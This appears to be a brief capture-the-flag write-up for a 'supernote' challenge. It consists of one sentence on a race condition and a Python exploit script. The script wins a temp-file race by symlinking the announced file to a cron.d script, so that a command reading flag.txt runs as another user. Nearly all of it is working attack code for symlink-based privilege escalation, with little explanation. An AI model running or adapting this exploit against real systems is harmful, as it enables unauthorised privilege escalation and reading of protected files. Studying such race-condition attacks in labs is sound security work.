The tempfile is outputted way before it is written, giving us enough time to add a symlink, which the problem will write to :3.

```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import os, sys, time
from subprocess import Popen, PIPE

DATA = "cat /home/supernote/flag.txt | write james pts/0"

while True:
    p = Popen(["/home/supernote/supernote"], stdin=PIPE, stderr=PIPE, stdout=PIPE, shell=True)
    p.stdin.write("ech@ech.ech\n")
    p.stdin.write("james\n")
    p.stdin.write(DATA+"\n")
    s = p.stderr.readline()
    fname = s[len("Temporary file is "):]
    fname = fname.strip()

    cron_name = "/home/supernote/cron.d/test.sh"

    for i in range(2048):
        try:
            os.symlink(cron_name, fname)
        except:
            pass
    print(p.communicate())

    sys.stdout.write(".")
    sys.stdout.flush()
```